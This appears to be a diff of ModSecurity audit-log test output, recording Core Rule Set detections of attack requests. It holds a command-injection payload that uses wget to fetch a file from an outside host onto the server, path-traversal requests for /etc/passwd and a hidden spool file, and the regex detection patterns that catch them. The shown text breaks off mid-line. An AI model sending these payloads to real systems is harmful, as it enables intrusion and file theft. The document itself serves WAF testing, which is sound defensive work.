@@ -1,198 +1,198 @@
----2Z4OLMBM---A--
-[08/May/2022:23:00:47 +0200] 1652043647 127.0.0.1 12345 127.0.0.1 80
----2Z4OLMBM---B--
+---Ytp6e9el---A--
+[09/May/2022:16:57:15 +0200] 1652108235 127.0.0.1 12345 127.0.0.1 80
+---Ytp6e9el---B--
 GET /appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS) HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----2Z4OLMBM---D--
+---Ytp6e9el---D--
 
----2Z4OLMBM---F--
+---Ytp6e9el---F--
 HTTP/1.1 200
 
----2Z4OLMBM---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5275 characters omitted)' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "139"] [id "932105"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: $(/usr/bin/wget found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652043647"] [ref "o0,15v37,65"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:\$(?:\((?:\(.*\)|.*)\)|\{.*\})|[<>]\(.*\))' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "351"] [id "932130"] [rev ""] [msg "Remote Command Execution: Unix Shell Expression Found"] [data "Matched Data: $(/usr/bin/wget http://1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs) found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652043647"] [ref "o0,64v37,65t:urlDecodeUni,t:cmdLine"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|=)\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?:l[\\\\'\"]*(?:s(?:[\\\\'\"]*(?:b[\\\\'\"]*_[\\\\'\"]*r (6252 characters omitted)' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "450"] [id "932150"] [rev ""] [msg "Remote Command Execution: Direct Unix Command Execution"] [data "Matched Data: $(/usr/bin/wget  found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652043647"] [ref "o0,16v37,65"]
-ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: usr/bin/wget found within ARGS:hostName: $(/usr/bin/wget http:/1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652043647"] [ref "o3,12v37,65t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `20' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 20)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652043647"] [ref ""]
+---Ytp6e9el---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5275 characters omitted)' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "139"] [id "932105"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: $(/usr/bin/wget found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652108235"] [ref "o0,15v37,65"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:\$(?:\((?:\(.*\)|.*)\)|\{.*\})|[<>]\(.*\))' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "351"] [id "932130"] [rev ""] [msg "Remote Command Execution: Unix Shell Expression Found"] [data "Matched Data: $(/usr/bin/wget http://1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs) found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652108235"] [ref "o0,64v37,65t:urlDecodeUni,t:cmdLine"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|=)\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?:l[\\\\'\"]*(?:s(?:[\\\\'\"]*(?:b[\\\\'\"]*_[\\\\'\"]*r (6252 characters omitted)' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "450"] [id "932150"] [rev ""] [msg "Remote Command Execution: Direct Unix Command Execution"] [data "Matched Data: $(/usr/bin/wget  found within ARGS:hostName: $(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652108235"] [ref "o0,16v37,65"]
+ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:hostName' (Value: `$(/usr/bin/wget http://1.1.1.1:12345/file -O /tmp/dsifnfnfdwsFFS)' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: usr/bin/wget found within ARGS:hostName: $(/usr/bin/wget http:/1.1.1.1:12345/file -o/tmp/dsifnfnfdwsffs)"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652108235"] [ref "o3,12v37,65t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `20' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 20)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/appliancews/getLicense"] [unique_id "1652108235"] [ref ""]
 
----2Z4OLMBM---I--
+---Ytp6e9el---I--
 
----2Z4OLMBM---J--
+---Ytp6e9el---J--
 
----2Z4OLMBM---Z--
+---Ytp6e9el---Z--
 
----jQfgZRZq---A--
-[08/May/2022:23:00:48 +0200] 1652043648 127.0.0.1 12345 127.0.0.1 80
----jQfgZRZq---B--
+---BkLyyPKt---A--
+[09/May/2022:16:57:16 +0200] 1652108236 127.0.0.1 12345 127.0.0.1 80
+---BkLyyPKt---B--
 GET /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1 HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----jQfgZRZq---D--
+---BkLyyPKt---D--
 
----jQfgZRZq---F--
+---BkLyyPKt---F--
 HTTP/1.1 200
 
----jQfgZRZq---H--
-ModSecurity: Warning. Matched "Operator `ValidateByteRange' with parameter `1-255' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "467"] [id "920270"] [rev ""] [msg "Invalid character in request (null character)"] [data "ARGS:seqID=../../../../etc/passwd\x00"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "OWASP_CRS"] [tag "OWASP_CRS/PROTOCOL_VIOLATION/EVASION"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o59,1v4,85t:urlDecodeUnio22,1v41,23t:urlDecodeUni"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5 (400 characters omitted)' against variable `REQUEST_URI_RAW' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "29"] [id "930100"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o39,4v4,85"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o39,4v4,85"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o39,4v4,85o39,4v4,85t:utf8toUnicode"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewappletfsa.cgi?seqid=../../../../etc/passwd&action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o39,4v4,85o39,4v4,85t:utf8toUnicodeo39,4v4,85t:cmdLine"]
-ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "76"] [id "930120"] [rev ""] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:seqID: ../../../../etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/FILE_INJECTION"] [tag "WASCTC/WASC-33"] [tag "OWASP_TOP_10/A4"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o12,10v41,23t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase"]
-ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:seqID: ../../../../etc/passwd\x00"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref "o12,10v41,23t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `38' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 38)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043648"] [ref ""]
+---BkLyyPKt---H--
+ModSecurity: Warning. Matched "Operator `ValidateByteRange' with parameter `1-255' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "467"] [id "920270"] [rev ""] [msg "Invalid character in request (null character)"] [data "ARGS:seqID=../../../../etc/passwd\x00"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "OWASP_CRS"] [tag "OWASP_CRS/PROTOCOL_VIOLATION/EVASION"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o59,1v4,85t:urlDecodeUnio22,1v41,23t:urlDecodeUni"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5 (400 characters omitted)' against variable `REQUEST_URI_RAW' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "29"] [id "930100"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,85"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,85"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd&Action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,85o39,4v4,85t:utf8toUnicode"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd\x00&Action=blast&hidenav=1' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewappletfsa.cgi?seqid=../../../../etc/passwd&action=blast&hidenav=1"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,85o39,4v4,85t:utf8toUnicodeo39,4v4,85t:cmdLine"]
+ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "76"] [id "930120"] [rev ""] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:seqID: ../../../../etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/FILE_INJECTION"] [tag "WASCTC/WASC-33"] [tag "OWASP_TOP_10/A4"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o12,10v41,23t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase"]
+ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:seqID' (Value: `../../../../etc/passwd\x00' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:seqID: ../../../../etc/passwd\x00"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o12,10v41,23t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `38' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 38)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref ""]
 
----jQfgZRZq---I--
+---BkLyyPKt---I--
 
----jQfgZRZq---J--
+---BkLyyPKt---J--
 
----jQfgZRZq---Z--
+---BkLyyPKt---Z--
 
----ND7JG8DS---A--
-[08/May/2022:23:00:50 +0200] 1652043650 127.0.0.1 12345 127.0.0.1 80
----ND7JG8DS---B--
+---BkLyyPKt---A--
+[09/May/2022:16:57:16 +0200] 1652108236 127.0.0.1 12345 127.0.0.1 80
+---BkLyyPKt---B--
 GET /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----ND7JG8DS---D--
+---BkLyyPKt---D--
 
----ND7JG8DS---F--
+---BkLyyPKt---F--
 HTTP/1.1 200
 
----ND7JG8DS---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5 (400 characters omitted)' against variable `REQUEST_URI_RAW' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "29"] [id "930100"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] 